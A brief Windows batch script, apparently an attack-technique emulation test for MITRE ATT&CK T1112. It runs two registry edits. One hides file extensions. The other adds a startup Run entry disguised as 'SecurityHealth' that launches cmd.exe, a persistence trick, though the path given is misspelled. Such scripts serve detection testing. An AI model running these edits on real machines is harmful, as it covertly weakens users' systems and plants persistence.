@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Modify Registry (T1112)
ECHO.
ECHO [+] Adding Registry Keys
ECHO 	- HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\
ECHO 	- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
ECHO -------------------------------------------------------------------
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d "C:\Window\System32\cmd.exe" /f
ECHO.
